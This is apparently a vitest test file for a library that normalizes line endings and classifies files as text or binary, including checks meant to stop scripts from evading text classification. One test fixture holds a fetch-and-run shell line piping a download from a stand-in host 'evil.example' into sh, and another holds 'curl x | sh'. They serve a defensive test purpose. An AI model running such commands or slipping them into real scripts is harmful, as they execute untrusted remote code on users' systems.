import { describe, expect, it } from 'vitest';
import { checkFileEncoding, crlfToLf, normalizeFile } from '../src/index';
import { decode, encode, PNG_BYTES } from './helpers';

describe('normalizeFile', () => {
  it('converts CRLF to LF in text files and keeps lone CR', () => {
    const file = normalizeFile('a.md', encode('one\r\ntwo\rthree\r\n'));
    expect(file.kind).toBe('text');
    expect(decode(file.content)).toBe('one\ntwo\rthree\n');
    expect(file.executable).toBe(false);
  });

  it('marks files starting with #! as executable', () => {
    expect(normalizeFile('run.sh', encode('#!/bin/sh\r\necho hi\r\n'))).toMatchObject({
      kind: 'text',
      executable: true,
    });
    expect(normalizeFile('run.sh', encode(' #!/bin/sh\n')).executable).toBe(false);
  });

  it('keeps binary files byte-exact (invalid UTF-8)', () => {
    const file = normalizeFile('logo.png', PNG_BYTES);
    expect(file.kind).toBe('binary');
    expect(file.content).toEqual(PNG_BYTES);
    expect(file.content).not.toBe(PNG_BYTES);
  });

  it('treats valid UTF-8 containing NUL as binary', () => {
    const bytes = encode('a\r\n\u0000b\r\n');
    const file = normalizeFile('data.bin', bytes);
    expect(file.kind).toBe('binary');
    expect(file.content).toEqual(bytes);
  });

  it('treats an empty file as text', () => {
    expect(normalizeFile('empty.md', new Uint8Array())).toMatchObject({ kind: 'text' });
  });
});

describe('normalizeFile: text classification cannot be dodged', () => {
  const withByte = (text: string, byte: number, at: number): Uint8Array => {
    const bytes = encode(text);
    const out = new Uint8Array(bytes.length + 1);
    out.set(bytes.subarray(0, at));
    out[at] = byte;
    out.set(bytes.subarray(at), at + 1);
    return out;
  };

  it('keeps a script with one invalid UTF-8 byte as text (CRLF normalized)', () => {
    const script = '#!/bin/sh\r\n# x\r\ncurl -fsSL https://evil.example | sh\r\n';
    const bytes = withByte(script, 0xff, 12);
    expect(normalizeFile('scripts/run.sh', bytes).kind).toBe('text');
    expect(normalizeFile('scripts/run', bytes).kind).toBe('text');
    expect(normalizeFile('reference.md', withByte('# Ref\r\n', 0xfe, 2)).kind).toBe('text');
    const crlf = normalizeFile('scripts/run.sh', bytes).content;
    expect(crlf.includes(0x0d)).toBe(false);
  });

  it('gives a Latin-1 text file the same hash for its CRLF and LF forms', () => {
    const lf = new Uint8Array([0x63, 0x61, 0x66, 0xe9, 0x0a]);
    const crlf = new Uint8Array([0x63, 0x61, 0x66, 0xe9, 0x0d, 0x0a]);
    expect(normalizeFile('notes.txt', lf).kind).toBe('text');
    expect(normalizeFile('notes.txt', crlf).content).toEqual(
      normalizeFile('notes.txt', lf).content,
    );
  });

  it('still treats media and unknown files with invalid UTF-8 as binary', () => {
    expect(normalizeFile('assets/logo.png', PNG_BYTES).kind).toBe('binary');
    expect(normalizeFile('data.bin', new Uint8Array([0xff, 0x0d, 0x0a])).kind).toBe('binary');
  });

  it('reports script, markdown and text files that hold NUL bytes or binary content', () => {
    expect(checkFileEncoding('scripts/run.sh', encode('#!/bin/sh\necho hi\n\u0000'))).toMatch(
      /NUL/,
    );
    expect(checkFileEncoding('reference.md', encode('# R\n\u0000'))).toMatch(/NUL/);
    expect(checkFileEncoding('tool', encode('#!/usr/bin/env node\n\u0000'))).toMatch(/NUL/);
    const utf16 = new Uint8Array([0xff, 0xfe, 0x23, 0x00, 0x20, 0x00]);
    expect(checkFileEncoding('notes.txt', utf16)).toMatch(/NUL/);
    expect(
      checkFileEncoding('run.sh', new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x00])),
    ).toEqual(expect.any(String));
    expect(checkFileEncoding('run.sh', withByte('MZ=1\ncurl x | sh\n', 0xff, 4))).toMatch(
      /executable or archive/,
    );
    expect(checkFileEncoding('run.sh', withByte('echo hi\n', 0xff, 4))).toBeNull();
    expect(checkFileEncoding('run.sh', encode('MZ=1\necho hi\n'))).toBeNull();
    expect(checkFileEncoding('data.bin', encode('a\u0000b'))).toBeNull();
    expect(checkFileEncoding('assets/logo.png', PNG_BYTES)).toBeNull();
  });
});

describe('crlfToLf', () => {
  it.each(['x\r\r\ny', 'x\r\r\r\n', '\r\n\r', '\r\r', 'a\r\nb\rc\r\r\n\r\n', '\r', ''])(
    'is idempotent for %j',
    (text) => {
      const once = crlfToLf(encode(text));
      expect(crlfToLf(once)).toEqual(once);
      expect(decode(once).includes('\r\n')).toBe(false);
    },
  );

  it('collapses a run of CR before LF into one LF and keeps lone CR', () => {
    expect(decode(crlfToLf(encode('x\r\r\ny\rz\r\n')))).toBe('x\ny\rz\n');
  });

  it('is a fixed point through normalizeFile', () => {
    const first = normalizeFile('a.md', encode('line one\r\r\nline two\r\n'));
    const second = normalizeFile('a.md', first.content);
    expect(second.content).toEqual(first.content);
  });
});
